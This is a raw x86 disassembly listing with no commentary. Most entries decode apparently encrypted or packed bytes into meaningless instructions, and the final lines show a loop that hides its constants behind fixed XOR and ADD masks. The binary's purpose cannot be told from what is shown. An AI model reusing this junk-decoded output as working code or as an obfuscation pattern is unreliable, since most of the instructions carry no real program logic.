  4181ac:	mov    dh,0xbb
  4181ae:	mov    ebp,0xecb4b1cc
  4181b3:	repnz cld 
  4181b5:	std    
  4181b6:	in     eax,dx
  4181b7:	add    al,0xe7
  4181b9:	fsin   
  4181bb:	push   es
  4181bc:	in     al,0xdc
  4181be:	enter  0xecce,0xff
  4181c2:	(bad)  
  4181c4:	mov    cl,0xf5
  4181c6:	mov    cl,0xeb
  4181c8:	int3   
  4181c9:	loope  0x4181b9
  4181cb:	shl    al,cl
  4181cd:	(bad)  
  4181ce:	cli    
  4181cf:	fxch   st(2)
  4181d1:	mov    al,0xc9
  4181d3:	mov    ecx,0xc7e5fad4
  4181d8:	rol    BYTE PTR ds:0xdbdee1c1,0xe0
  4181df:	std    
  4181e0:	(bad)  
  4181e3:	loope  0x4181d2
  4181e5:	out    0xc4,al
  4181e7:	mov    cl,0xf6
  4181e9:	mov    edx,0xf1c9eab7
  4181ee:	sti    
  4181ef:	mov    ch,0xb5
  4181f1:	mov    ebp,0x1cef0fa
  4181f6:	add    al,0xc7
  4181f8:	(bad)  
  4181f9:	std    
  4181fa:	std    
  4181fb:	(bad)  
  4181fd:	(bad)  
  4181ff:	out    dx,eax
  418200:	(bad)  
  418202:	in     eax,0xaa
  418204:	enter  0xb2e2,0xc4
  418208:	in     al,dx
  418209:	loop   0x418206
  41820b:	out    dx,al
  41820c:	aam    0xb4
  41820e:	in     al,0xf5
  418210:	repz lock std 
  418213:	mov    esi,0xbac7dcf8
  418218:	ffree  st(7)
  41821a:	inc    ah
  41821c:	xlat   BYTE PTR ds:[ebx]
  41821d:	mov    esp,0x12cf03ef
  418222:	ret    0xd1a9
  418225:	shr    esi,0xc6
  418228:	(bad)  [edi-0x39280f34]
  41822e:	repz sti 
  418230:	fldlg2 
  418232:	lock ret 0xf3c7
  418236:	(bad)  
  418237:	rol    dl,cl
  418239:	cli    
  41823a:	call   0xfc517835
  41823f:	iret   
  418240:	in     al,0x8
  418242:	lods   eax,DWORD PTR ds:[esi]
  418243:	out    dx,al
  418244:	out    0xe9,al
  418246:	into   
  418247:	cmc    
  418248:	test   esp,0xb8eec0f3
  41824e:	repz neg esi
  418251:	mov    eax,0xecf4f4
  418256:	shl    ebp,cl
  418258:	shr    ecx,0xe4
  41825b:	fisttp DWORD PTR [esi]
  41825d:	fisttp WORD PTR [ebx]
  41825f:	retf   
  418260:	cli    
  418261:	add    bh,cl
  418263:	fsubr  DWORD PTR [ebp-0x143a304f]
  418269:	retf   
  41826a:	aad    0xd2
  41826c:	out    dx,eax
  41826d:	in     eax,0xd7
  41826f:	mov    dl,0xef
  418271:	test   BYTE PTR [edx],0xed
  418274:	out    0xd2,eax
  418276:	int3   
  418277:	(bad)
  41827a:	out    0xc7,al
  41827c:	ffree  st(6)
  41827e:	retf   0xcb01
  418281:	push   es
  418282:	in     al,dx
  418283:	fisubr WORD PTR [esi-0x49531243]
  418289:	cmc    
  41828a:	mul    ah
  41828c:	cli    
  41828d:	in     al,0xdf
  41828f:	(bad)  
  418291:	repz add dh,ch
  418294:	mov    esi,0xb9d7d2f3
  418299:	or     esi,ebx
  41829b:	pop    es
  41829c:	add    BYTE PTR [ecx],cl
  41829e:	str    ebp
  4182a1:	or     eax,0xf6d1b0e0
  4182a6:	out    0xc7,al
  4182a8:	mov    bh,0xe5
  4182aa:	iret   
  4182ab:	enter  0xb7ed,0xf4
  4182af:	int3   
  4182b0:	out    dx,eax
  4182b1:	jmp    0xe3f686a8
  4182b6:	rol    DWORD PTR [edx],0xe6
  4182b9:	jmp    0x4182c0
  4182bb:	push   es
  4182bc:	add    edx,ebx
  4182be:	aad    0xfc
  4182c0:	paddusw mm0,mm7
  4182c3:	in     eax,dx
  4182c4:	repz enter 0xc1b0,0xc7
  4182c9:	loop   0x418295
  4182cb:	in     al,0xf9
  4182cd:	retf   
  4182ce:	shr    dl,1
  4182d0:	std    
  4182d1:	mov    ebp,0xf9cdf0d1
  4182d6:	clc    
  4182d7:	mov    esi,0xffe4dac4
  4182dc:	out    0xd5,al
  4182de:	cmc    
  4182df:	psraw  mm2,QWORD PTR [ebx]
  4182e2:	jmp    0xd3c8:0xc0c1b1dc
  4182e9:	into   
  4182ea:	stc    
  4182eb:	(bad)  
  4182ed:	aad    0xcb
  4182ef:	repnz (bad) 
  4182f2:	call   0xdb3e49fe
  4182f7:	(bad)  
  4182f8:	std    
  4182f9:	clc    
  4182fa:	std    
  4182fb:	add    edi,eax
  4182fd:	std    
  4182fe:	(bad)  
  418300:	repz retf 0xdedc
  418304:	out    0xcc,eax
  418306:	mov    ch,0xac
  418308:	mov    bl,0xca
  41830a:	mov    dh,0xef
  41830c:	out    0xfd,eax
  41830e:	icebp  
  41830f:	not    bl
  418311:	ret    
  418312:	enter  0xf8dc,0xdd
  418316:	mov    esi,0xfbffc1df
  41831b:	loope  0x418326
  41831d:	cld    
  41831e:	cld    
  41831f:	out    0xe8,al
  418321:	out    0xd9,al
  418323:	test   eax,0xd1ebcce1
  418328:	repnz out 0xdb,eax
  41832b:	sti    
  41832c:	mov    edi,0xf3c8f2d0
  418331:	mov    al,0xef
  418333:	out    dx,eax
  418334:	lock mov ah,0xdb
  418337:	(bad)  
  418339:	dec    edx
  41833b:	shr    ecx,0xe2
  41833e:	out    0xcf,al
  418340:	or     eax,0xdcf2e307
  418345:	mov    esi,0xf0c6cdd5
  41834a:	(bad)  
  41834c:	vpandn xmm7,xmm0,xmm1
  418350:	icebp  
  418351:	fcmovu st,st(0)
  418353:	xlat   BYTE PTR ds:[ebx]
  418354:	fadd   st(6),st
  418356:	shl    eax,1
  418358:	(bad)  
  41835a:	sti    
  41835b:	loopne 0x418364
  41835d:	in     eax,dx
  41835e:	jecxz  0x418344
  418360:	into   
  418361:	rcl    eax,cl
  418363:	repz retf 
  418365:	mov    al,0xb6
  418367:	bnd call 0xecf9641d
  41836d:	repz mov edi,0xd1c2dbd9
  418373:	ret    
  418374:	add    BYTE PTR [eax],al
  418376:	fadd   DWORD PTR [edx]
  418378:	in     al,0xf4
  41837a:	mov    edi,0xf0106e3
  41837f:	(bad)
  418382:	int    0xc0
  418384:	retf   
  418385:	int    0xe0
  418387:	xlat   BYTE PTR ds:[ebx]
  418388:	repz in eax,0xd3
  41838b:	fcmovb st,st(7)
  41838d:	clc    
  41838e:	in     al,0xcc
  418390:	div    DWORD PTR [ebp+ebx*8-0x2529030f]
  418397:	out    0xeb,al
  418399:	push   es
  41839a:	or     ah,bl
  41839c:	mov    ebp,0xe101de0a
  4183a1:	in     eax,0xbe
  4183a3:	out    dx,al
  4183a4:	loope  0x41836c
  4183a6:	stos   DWORD PTR es:[edi],eax
  4183a7:	(bad)  
  4183a8:	out    dx,eax
  4183a9:	(bad)  
  4183aa:	cmc    
  4183ab:	cmc    
  4183ac:	(bad)  [ebp+ebx*8-0x44300c2d]
  4183b3:	aam    0xee
  4183b5:	into   
  4183b6:	shl    edx,cl
  4183b8:	cli    
  4183b9:	ret    0xe700
  4183bc:	out    0xee,eax
  4183be:	fld    DWORD PTR [eax]
  4183c0:	out    0xf,al
  4183c2:	int3   
  4183c3:	mov    ebp,0xeeb6c3bc
  4183c8:	mov    dh,0xc5
  4183ca:	mov    ecx,0xbabeffc8
  4183cf:	fnstsw WORD PTR [eax-0x46043102]
  4183d5:	out    dx,al
  4183d6:	fdivr  QWORD PTR [ebp+0xbdcf8f6]
  4183dc:	add    bh,al
  4183de:	les    ecx,FWORD PTR [eax]
  4183e0:	clc    
  4183e1:	(bad)  
  4183e3:	scas   al,BYTE PTR es:[edi]
  4183e4:	loopne 0x4183ae
  4183e6:	repnz hlt 
  4183e8:	sti    
  4183e9:	mov    dl,0xc1
  4183eb:	sti    
  4183ec:	imul   ebx
  4183ee:	int3   
  4183ef:	in     al,0xfb
  4183f1:	aam    0xd7
  4183f3:	out    dx,al
  4183f4:	aam    0xd5
  4183f6:	lock pop es
  4183f8:	(bad)  
  4183fa:	cli    
  4183fb:	imul   eax
  4183fd:	or     ebx,esi
  4183ff:	in     eax,0xda
  418401:	out    0xb8,eax
  418403:	retf   0xeeee
  418406:	mov    dl,0xd0
  418408:	fidiv  DWORD PTR [esi-0x2430191c]
  41840e:	(bad)  
  41840f:	mov    eax,0xf7d0c9ba
  418414:	not    cl
  418416:	loopne 0x418409
  418418:	add    ebp,eax
  41841a:	clc    
  41841b:	loopne 0x4183f4
  41841d:	add    ebp,eax
  41841f:	(bad)  
  418420:	fmul   QWORD PTR [edx]
  418422:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418423:	scas   al,BYTE PTR es:[edi]
  418424:	ret    0xcac0
  418427:	jmp    0xe8c9:0xf5dbcecf
  41842e:	mov    edx,0x1fffbbf
  418433:	call   0xd22f7af1
  418438:	(bad)
  41843b:	or     cl,cl
  41843d:	(bad)  
  41843e:	jmp    0x41841c
  418440:	jmp    0xdff4480f
  418445:	lods   eax,DWORD PTR ds:[esi]
  418446:	mov    bl,0xe0
  418448:	cmc    
  418449:	shl    BYTE PTR [ebx-0x92d2f39],0xf0
  418450:	mov    esp,0xf8be03ed
  418455:	sti    
  418456:	out    0xc2,eax
  418458:	or     esi,edi
  41845a:	fcmovu st,st(1)
  41845c:	in     al,0x5
  41845e:	in     al,0x13
  418460:	inc    esp
  418462:	out    dx,eax
  418463:	fdiv   DWORD PTR [ebx-0x442d2f2b]
  418469:	hlt    
  41846a:	loope  0x41841c
  41846c:	cmc    
  41846d:	aad    0xd3
  41846f:	mov    ch,0xbc
  418471:	in     eax,dx
  418472:	cmc    
  418473:	mov    edx,0xe5d7e7f9
  418478:	in     eax,0xd2
  41847a:	shl    esi,0x7
  41847d:	(bad)  
  41847f:	in     al,dx
  418480:	stc    
  418481:	add    al,0xe2
  418483:	xlat   BYTE PTR ds:[ebx]
  418484:	mov    edi,0xe2acf3b3
  418489:	(bad)  
  41848a:	loopne 0x418476
  41848c:	mov    eax,0xbfcfffc8
  418491:	aad    0xce
  418493:	(bad)  
  418495:	mov    bl,0x2
  418498:	ret    
  418499:	retf   0xc8e2
  41849c:	add    bh,bl
  41849e:	(bad)  
  4184a0:	add    BYTE PTR [eax],al
  4184a2:	(bad)  
  4184a3:	loop   0x418467
  4184a5:	jmp    0xb6f5:0xd1b4dced
  4184ac:	iret   
  4184ad:	retf   0xf4e9
  4184b0:	int    0xd9
  4184b2:	fnstcw WORD PTR [ecx-0xb072907]
  4184b8:	aam    0x9
  4184ba:	aam    0xfe
  4184bc:	pop    es
  4184bd:	add    dl,bh
  4184bf:	hlt    
  4184c0:	enter  0xb213,0xe6
  4184c4:	lock mov al,0xe7
  4184c7:	sti    
  4184c8:	jmp    0xd1326f9d
  4184cd:	in     al,dx
  4184ce:	fsubr  st,st(6)
  4184d0:	jmp    0xe1c1:0xc7bad6d9
  4184d7:	inc    al
  4184d9:	add    esi,edi
  4184db:	idiv   eax
  4184dd:	loop   0x4184c4
  4184df:	jmp    0x4184bf
  4184e1:	or     eax,0xcaccbdc8
  4184e6:	fadd   st(1),st
  4184e8:	jmp    0x4184d6
  4184ea:	in     al,dx
  4184eb:	mov    ch,0xe5
  4184ed:	(bad)  
  4184ef:	xlat   BYTE PTR ds:[ebx]
  4184f0:	fpatan 
  4184f2:	mov    ebx,0xede507da
  4184f7:	add    al,0xdd
  4184f9:	inc    esi
  4184fb:	retf   0xcade
  4184fe:	add    BYTE PTR [edi],cl
  418500:	clc    
  418501:	stc    
  418502:	call   0xc42647e5
  418507:	retf   
  418508:	into   
  418509:	retf   0xebbb
  41850c:	fcmove st,st(5)
  41850e:	mov    ebp,0x2effcf9
  418513:	loope  0x4184f3
  418515:	std    
  418516:	(bad)  
  418517:	mov    esp,0xc6c5b9
  41851c:	pop    es
  41851d:	retf   0xefc5
  418520:	fcmovbe st,st(2)
  418522:	mov    esi,0xe9acc8ac
  418527:	(bad)  
  418528:	sti    
  418529:	(bad)  
  41852a:	repz mov dh,0xb1
  41852d:	mov    al,0xea
  41852f:	icebp  
  418530:	(bad)  
  418532:	aam    0xf0
  418534:	mov    ch,0xfc
  418536:	aad    0xc2
  418538:	xlat   BYTE PTR ds:[ebx]
  418539:	lock fsub st,st(6)
  41853c:	std    
  41853d:	retf   
  41853e:	int    0xdc
  418540:	in     al,0xd2
  418542:	ret    0xcbac
  418545:	in     eax,0xd0
  418547:	scas   al,BYTE PTR es:[edi]
  418548:	repnz in eax,0xf7
  41854b:	fcmovnbe st,st(4)
  41854d:	rcl    bh,cl
  41854f:	repz ret 
  418551:	fidivr DWORD PTR [edi-0x21fd0824]
  418557:	rol    BYTE PTR [edx],0xfe
  41855a:	jecxz  0x418537
  41855c:	(bad)  
  41855e:	enter  0xff0c,0xdd
  418562:	test   al,0xa8
  418564:	mov    ebp,0xccb7c4b6
  418569:	fxch   st(2)
  41856b:	fidivr DWORD PTR [eax-0x328062d]
  418571:	add    edi,ebp
  418573:	std    
  418574:	jecxz  0x418551
  418576:	cld    
  418577:	cld    
  418578:	out    0xe6,al
  41857a:	or     eax,ecx
  41857c:	clc    
  41857d:	loopne 0x41855b
  41857f:	or     ah,ah
  418581:	std    
  418582:	in     eax,0xe6
  418584:	rol    bl,cl
  418586:	mov    dl,0xb5
  418588:	iret   
  418589:	jmp    0xee14587b
  41858e:	std    
  41858f:	cli    
  418590:	repnz mov esp,0xdbfbf1e9
  418596:	in     eax,0xfe
  418598:	ret    
  418599:	jecxz  0x41855b
  41859b:	sti    
  41859c:	jecxz  0x4185a1
  41859e:	pop    es
  41859f:	cli    
  4185a0:	(bad)  
  4185a2:	mov    edi,0xabafc6a9
  4185a7:	mul    al
  4185a9:	in     eax,dx
  4185aa:	aad    0xce
  4185ac:	hlt    
  4185ad:	sti    
  4185ae:	fsub   st,st(3)
  4185b0:	repz stc 
  4185b2:	int    0xdd
  4185b4:	loope  0x4185bb
  4185b6:	fcom   st(0)
  4185b8:	ret    
  4185b9:	add    al,0xd4
  4185bb:	fstp   st(5)
  4185bd:	add    ch,dl
  4185bf:	or     al,cl
  4185c1:	fnstcw WORD PTR [ecx-0x2c423316]
  4185c7:	rol    bh,cl
  4185c9:	shl    ch,0xf6
  4185cc:	retf   
  4185cd:	retf   
  4185ce:	mov    bh,0xf1
  4185d0:	test   dl,0xd5
  4185d3:	out    0xb5,eax
  4185d5:	neg    esi
  4185d7:	add    al,0x3
  4185d9:	mov    eax,0x7ffe10b
  4185de:	cmc    
  4185df:	loop   0x4185c2
  4185e1:	int3   
  4185e2:	out    0xe9,eax
  4185e4:	jmp    0x4185a2
  4185e6:	aad    0xeb
  4185e8:	mov    ah,0xd2
  4185ea:	(bad)  
  4185eb:	out    dx,eax
  4185ec:	aam    0xf3
  4185ee:	lds    edi,FWORD PTR [edx+eiz*8-0xe3f2308]
  4185f5:	(bad)  
  4185f7:	out    0xe4,eax
  4185f9:	lock cmc 
  4185fb:	loopne 0x41860b
  4185fd:	jmp    0x4185de
  4185ff:	(bad)  
  418601:	fucomp st(7)
  418603:	fmul   st(0),st
  418605:	mov    esi,0xe7ebacd3
  41860a:	(bad)  [ebx+ebx*8-0x34a4226]
  418611:	sti    
  418612:	cli    
  418613:	mov    esi,0xd6c3b8bf
  418618:	aam    0xbc
  41861a:	or     esp,ebx
  41861c:	(bad)  
  41861e:	(bad)  
  41861f:	int    0xc1
  418621:	or     eax,0xedaeebca
  418626:	icebp  
  418627:	ret    
  418628:	xlat   BYTE PTR ds:[ebx]
  418629:	test   esi,0xd6cdc5db
  41862f:	add    ebx,esp
  418631:	fcmovu st,st(4)
  418633:	mov    esp,0xbd03c3f4
  418638:	rol    ebp,cl
  41863a:	aad    0xfa
  41863c:	test   DWORD PTR [esi],0xbd9d9fb
  418642:	out    dx,al
  418643:	lock in al,0xef
  418646:	cmc    
  418647:	call   0xfb1380f5
  41864c:	(bad)  
  41864d:	fcmovbe st,st(3)
  41864f:	(bad)  
  418650:	int    0xf3
  418652:	fsub   st,st(2)
  418654:	jecxz  0x418635
  418656:	ror    DWORD PTR [ebx],1
  418658:	in     eax,0xf1
  41865a:	add    al,0xf6
  41865c:	call   0xda0f9470
  418661:	leave  
  418662:	scas   al,BYTE PTR es:[edi]
  418663:	enter  0xc8ed,0xec
  418667:	retf   
  418668:	mov    al,0xd1
  41866a:	iret   
  41866b:	(bad)  [edi-0x2835262f]
  418671:	jmp    0xfbed:0xfab8d3e9
  418678:	aad    0xfc
  41867a:	sti    
  41867b:	aad    0xd9
  41867d:	dec    DWORD PTR [eax]
  41867f:	iret   
  418680:	fucomp st(4)
  418682:	mov    ecx,0xb0b6b0c9
  418687:	in     al,0xfa
  418689:	loope  0x41864b
  41868b:	icebp  
  41868c:	mov    al,0xac
  41868e:	mov    ecx,0xfcc2b8f3
  418693:	sar    BYTE PTR [eax-0xc242321],1
  418699:	loope  0x41869b
  41869b:	in     eax,0xc0
  41869d:	in     eax,0xf5
  41869f:	out    dx,eax
  4186a0:	jmp    0xe5d5:0xe3c2bdef
  4186a7:	les    esi,FWORD PTR [edi-0x36384b46]
  4186ad:	cli    
  4186ae:	mov    ch,0xd2
  4186b0:	mov    eax,0xe3f4d6bd
  4186b5:	fsubrp st(1),st
  4186b7:	loopne 0x4186b0
  4186b9:	repnz cld 
  4186bb:	stc    
  4186bc:	cld    
  4186bd:	add    cl,BYTE PTR [esi]
  4186bf:	add    al,0xfa
  4186c1:	(bad)  
  4186c3:	test   eax,0xf0b3c4f6
  4186c8:	mov    dh,0xbb
  4186ca:	aam    0xf0
  4186cc:	iret   
  4186cd:	mov    al,0xf4
  4186cf:	in     al,dx
  4186d0:	int    0xd0
  4186d2:	mov    ecx,0xd6dcb8d5
  4186d7:	mov    esp,0xfafddee3
  4186dc:	sti    
  4186dd:	iret   
  4186de:	fisttp QWORD PTR ds:0xcbbde9cb
  4186e4:	loope  0x4186d6
  4186e6:	retf   
  4186e7:	in     al,0xb2
  4186e9:	aad    0xda
  4186eb:	xlat   BYTE PTR ds:[ebx]
  4186ec:	repz fldz 
  4186ef:	icebp  
  4186f0:	mov    ecx,0xdeec02f9
  4186f5:	ret    0xf8f5
  4186f8:	rol    DWORD PTR [esi],cl
  4186fa:	retf   
  4186fb:	add    eax,0xe2fce302
  418700:	add    ebx,esi
  418702:	out    dx,eax
  418703:	scas   eax,DWORD PTR es:[edi]
  418704:	shl    al,cl
  418706:	repz mov esp,0xc7eed3ad
  41870c:	fmul   st,st(3)
  41870e:	shr    ecx,cl
  418710:	add    ch,bh
  418712:	loop   0x418708
  418714:	ret    
  418715:	(bad)  
  418716:	(bad)  
  418717:	in     al,0xc2
  418719:	loope  0x4186e0
  41871b:	(bad)  
  41871c:	dec    ecx
  41871e:	or     ah,bl
  418720:	or     cl,bl
  418722:	stos   DWORD PTR es:[edi],eax
  418723:	retf   0xbccd
  418726:	hlt    
  418727:	scas   al,BYTE PTR es:[edi]
  418728:	int    0xc0
  41872a:	mov    bh,0xed
  41872c:	(bad)  
  41872e:	hlt    
  41872f:	fdivr  st,st(6)
  418731:	into   
  418732:	fld    st(3)
  418734:	cmc    
  418735:	stc    
  418736:	fxam   
  418738:	mov    esp,0xfcefc4f5
  41873d:	lds    ecx,FWORD PTR [edi]
  41873f:	iret   
  418740:	(bad)  
  418742:	int3   
  418743:	xlat   BYTE PTR ds:[ebx]
  418744:	repz mov esp,0xc7c9cdc1
  41874a:	fmul   st,st(4)
  41874c:	(bad)
  41874f:	stc    
  418750:	jecxz  0x41874c
  418752:	(bad)  
  418753:	fdiv   st(3),st
  418755:	std    
  418756:	(bad)  
  418757:	rcl    dh,1
  418759:	aad    0xc0
  41875b:	loop   0x418723
  41875d:	fld    st(6)
  41875f:	pop    es
  418760:	rol    DWORD PTR [ecx],0xce
  418763:	loop   0x41874a
  418765:	(bad)
  418768:	(bad)  [ebp-0x39312b3f]
  41876e:	enter  0xbbf4,0xef
  418772:	mov    esp,0xfcc102
  418777:	fsubrp st(7),st
  418779:	cld    
  41877a:	aad    0xfa
  41877c:	sti    
  41877d:	(bad)  
  41877e:	or     al,0xe8
  418780:	(bad)  
  418782:	repz fucomp st(2)
  418785:	in     al,dx
  418786:	iret   
  418787:	out    dx,eax
  418788:	(bad)  
  418789:	iret   
  41878a:	sti    
  41878b:	(bad)  
  41878d:	mov    edx,0xccfeb6e9
  418792:	lock mov ebp,0xebf3c603
  418798:	fstp   st(6)
  41879a:	pop    es
  41879b:	(bad)  
  41879d:	in     eax,dx
  41879e:	or     bl,bl
  4187a0:	or     al,0xce
  4187a2:	fbstp  TBYTE PTR [ebx-0x32090f2d]
  4187a8:	fcmovne st,st(7)
  4187aa:	in     al,dx
  4187ab:	jmp    0xfbf75d9e
  4187b0:	sti    
  4187b1:	add    DWORD PTR [eax-0x2b2f4740],edi
  4187b7:	cld    
  4187b8:	rol    esp,0x9
  4187bb:	or     cl,ch
  4187bd:	out    0xe2,al
  4187bf:	fmul   st,st(1)
  4187c1:	icebp  
  4187c2:	shr    BYTE PTR [ebp-0x2a285b20],1
  4187c8:	idiv   BYTE PTR [edx-0x34322617]
  4187ce:	jmp    0xbcfb6bbb
  4187d3:	rcr    esi,cl
  4187d5:	cld    
  4187d6:	lock add eax,0xc0eae5d4
  4187dc:	fsincos 
  4187de:	in     eax,0xfd
  4187e0:	jmp    0x4187d4
  4187e2:	shr    DWORD PTR [edi+ebx*8-0x94a3c39],0xcb
  4187ea:	jmp    0xbfcd:0xddbaeaf8
  4187f1:	add    eax,ecx
  4187f3:	pop    es
  4187f4:	loopne 0x4187f4
  4187f6:	sar    bl,1
  4187f8:	in     al,0xe7
  4187fa:	fstp   st(1)
  4187fc:	fcomip st,st(5)
  4187fe:	pop    es
  4187ff:	std    
  418800:	enter  0xc6e4,0xae
  418804:	xlat   BYTE PTR ds:[ebx]
  418805:	lods   eax,DWORD PTR ds:[esi]
  418806:	jmp    0xf2d8:0xf9e6f7db
  41880d:	lods   al,BYTE PTR ds:[esi]
  41880e:	out    dx,al
  41880f:	mov    edx,0xe8e3dff3
  418814:	ret    
  418815:	aam    0xe5
  418817:	add    eax,DWORD PTR [ecx]
  418819:	sti    
  41881a:	(bad)  
  41881c:	enter  0xe0fe,0xce
  418820:	invd   
  418822:	loope  0x4187f1
  418824:	rol    eax,cl
  418826:	jmp    0xdbbb:0xcfeeacc0
  41882d:	int3   
  41882e:	div    BYTE PTR [ebp-0x4923170e]
  418834:	inc    DWORD PTR ds:0xf9ded4fa
  41883a:	shl    edi,1
  41883c:	neg    eax
  41883e:	out    dx,eax
  41883f:	or     al,BYTE PTR ds:0xded2b213
  418845:	mov    ebp,0xe8e4ced6
  41884a:	sar    eax,0xbb
  41884d:	test   esp,0x3deebb8
  418853:	fdivr  DWORD PTR [eax-0x22fc2702]
  418859:	sar    DWORD PTR [edi-0x372bf123],1
  41885f:	fisttp QWORD PTR [ecx+ecx*1]
  418862:	iret   
  418863:	mov    dl,0xdf
  418865:	int3   
  418866:	jecxz  0x41882c
  418868:	mov    cl,0xf5
  41886a:	retf   
  41886b:	retf   0xcbd3
  41886e:	mov    ebp,0xcfeed3e4
  418873:	cmc    
  418874:	aam    0xbd
  418876:	(bad)  
  418878:	push   es
  418879:	jecxz  0x41885c
  41887b:	les    ecx,FWORD PTR [ecx]
  41887d:	pop    es
  41887e:	add    al,0xd8
  418880:	loopne 0x418855
  418882:	mov    eax,0xe1d7c6ae
  418887:	ror    ebx,1
  418889:	div    BYTE PTR [ebx+ebx*8-0xd2b282b]
  418890:	clc    
  418891:	out    dx,al
  418892:	jmp    0xfa1c6f76
  418897:	cli    
  418898:	jmp    0xfce1:0x9fcd4e5
  41889f:	out    0xf2,al
  4188a1:	or     eax,0xb2f2c1c5
  4188a6:	(bad)  
  4188a7:	retf   0xd3b1
  4188aa:	mov    al,0xf8
  4188ac:	(bad)  
  4188ad:	mov    ch,0xd4
  4188af:	imul   esi
  4188b1:	hlt    
  4188b2:	fidivr WORD PTR [edx-0x1cff410e]
  4188b8:	out    0xd0,al
  4188ba:	retf   
  4188bb:	fcmovnu st,st(3)
  4188bd:	enter  0xbcd,0x13
  4188c1:	in     eax,dx
  4188c2:	(bad)  
  4188c3:	repz test eax,0xd5b0aece
  4188c9:	mov    al,0xb1
  4188cb:	into   
  4188cc:	out    dx,al
  4188cd:	clc    
  4188ce:	mov    edx,0xf6fdb403
  4188d3:	ret    
  4188d4:	rcr    bl,cl
  4188d6:	int    0x4
  4188d8:	in     al,0xdb
  4188da:	or     ah,bl
  4188dc:	add    al,0xef
  4188de:	out    dx,al
  4188df:	int    0xda
  4188e1:	in     al,dx
  4188e2:	in     al,0xef
  4188e4:	(bad)  
  4188e5:	in     al,0xe5
  4188e7:	in     al,dx
  4188e8:	jecxz  0x4188b6
  4188ea:	repz out 0xba,eax
  4188ed:	lock retf 0xccd1
  4188f1:	retf   0xeff8
  4188f4:	repnz repz idiv DWORD PTR [ebp-0x23194344]
  4188fc:	push   es
  4188fd:	pop    es
  4188fe:	fcmovu st,st(6)
  418900:	or     eax,0xd1cbf0ee
  418905:	jmp    0xd62b5fd9
  41890a:	in     eax,dx
  41890b:	icebp  
  41890c:	stc    
  41890d:	(bad)  
  41890e:	out    dx,al
  41890f:	repnz mov ebx,0xf8f6d7d3
  418915:	shl    cl,1
  418917:	mov    esi,0xd9f5c1d9
  41891c:	jecxz  0x4188e5
  41891e:	into   
  41891f:	std    
  418920:	fucomi st,st(2)
  418922:	(bad)  
  418923:	jecxz  0x4188ea
  418925:	in     al,dx
  418926:	into   
  418927:	retf   0xf9d3
  41892a:	aad    0xb7
  41892c:	(bad)  
  41892d:	(bad)  
  41892e:	xlat   BYTE PTR ds:[ebx]
  41892f:	repnz (bad) 
  418931:	lock rcr eax,cl
  418934:	(bad)  
  418935:	fcmovnbe st,st(1)
  418937:	in     al,dx
  418938:	add    DWORD PTR [eax-0x1c183000],edi
  41893e:	push   es
  41893f:	or     BYTE PTR [edx],cl
  418941:	bsf    ebp,ebx
  418944:	ret    
  418945:	in     eax,0xcf
  418947:	fadd   st(6),st
  418949:	not    dh
  41894b:	scas   al,BYTE PTR es:[edi]
  41894c:	in     al,0xfd
  41894e:	aam    0xe9
  418950:	repnz mov ecx,0xf7d0badb
  418956:	repz or ebx,eax
  418959:	rol    bh,0xd6
  41895c:	add    esi,ecx
  41895e:	psubq  mm1,QWORD PTR ds:0xefa9d1e7
  418965:	in     al,0xed
  418967:	mov    dh,0xf1
  418969:	in     eax,dx
  41896a:	mov    al,0xf0
  41896c:	dec    esi
  41896e:	jmp    0xf0127e31
  418973:	cli    
  418974:	repz push es
  418976:	jecxz  0x41893f
  418978:	hlt    
  418979:	inc    ch
  41897b:	add    al,0xe9
  41897d:	push   es
  41897e:	call   0xb30b7385
  418983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418984:	in     eax,0xf7
  418986:	mov    ebp,0xb5d5c7f4
  41898b:	cmc    
  41898c:	rcr    dl,cl
  41898e:	cli    
  41898f:	fsubp  st(3),st
  418991:	fucomp st(4)
  418993:	fcmovb st,st(0)
  418995:	loop   0x41895e
  418997:	icebp  
  418998:	rol    bh,1
  41899a:	aad    0xe3
  41899c:	shr    edx,0xc3
  41899f:	loopne 0x41896a
  4189a1:	in     al,0xea
  4189a3:	shl    esi,1
  4189a5:	test   al,0xcc
  4189a7:	jmp    0x41898f
  4189a9:	jmp    0xea1d7273
  4189ae:	repz std 
  4189b0:	fcmovnb st,st(3)
  4189b2:	(bad)  
  4189b3:	mov    dh,0x3
  4189b5:	mov    edi,0xc2e6f7bc
  4189ba:	neg    dl
  4189bc:	cld    
  4189bd:	pop    es
  4189be:	out    0xe8,eax
  4189c0:	int3   
  4189c1:	fmul   st,st(2)
  4189c3:	in     al,dx
  4189c4:	sub    eax,ecx
  4189c6:	cmp    edx,eax
  4189c8:	jne    0x418b19
  4189ce:	mov    eax,DWORD PTR [ebp-0x8]
  4189d1:	add    eax,DWORD PTR [ebp-0xd0]
  4189d7:	mov    al,BYTE PTR [eax]
  4189d9:	mov    BYTE PTR [ebp-0xf5],al
  4189df:	mov    eax,DWORD PTR [ebp-0xdc]
  4189e5:	xor    eax,0x75108b5
  4189ea:	add    eax,0x3272fb
  4189ef:	mov    DWORD PTR [ebp-0xfc],eax
  4189f5:	jmp    0x418a07
  4189fa:	mov    eax,DWORD PTR [ebp-0xfc]
  418a00:	inc    eax
  418a01:	mov    DWORD PTR [ebp-0xfc],eax
  418a07:	mov    eax,DWORD PTR [ebp-0xd8]
  418a0d:	xor    eax,0x75108b5
  418a12:	add    eax,0x3272fb
  418a17:	cmp    DWORD PTR [ebp-0xfc],eax
  418a1d:	jae    0x418aa4
  418a23:	mov    eax,DWORD PTR [ebp-0xfc]
  418a29:	sub    eax,0x3272fb
  418a2e:	xor    eax,0x75108b5
  418a33:	add    eax,0x7f55d8f2
  418a38:	mov    ecx,DWORD PTR [ebp-0xfc]
  418a3e:	mov    DWORD PTR [ebp+ecx*4-0xf4],eax
  418a45:	mov    eax,DWORD PTR [ebp-0xfc]
  418a4b:	cmp    DWORD PTR [ebp+eax*4-0xf4],0x244ecb9d
  418a56:	jbe    0x418a80
  418a5c:	mov    eax,DWORD PTR [ebp-0xfc]
  418a62:	mov    eax,DWORD PTR [ebp+eax*4-0xf4]
  418a69:	add    eax,0x405fcdc
  418a6e:	mov    ecx,DWORD PTR [ebp-0xfc]
  418a74:	mov    DWORD PTR [ebp+ecx*4-0xf4],eax
  418a7b:	jmp    0x418a9f
  418a80:	mov    eax,DWORD PTR [ebp-0xfc]
  418a86:	mov    eax,DWORD PTR [ebp+eax*4-0xf4]
  418a8d:	sub    eax,0x250bcdc
  418a92:	mov    ecx,DWORD PTR [ebp-0xfc]
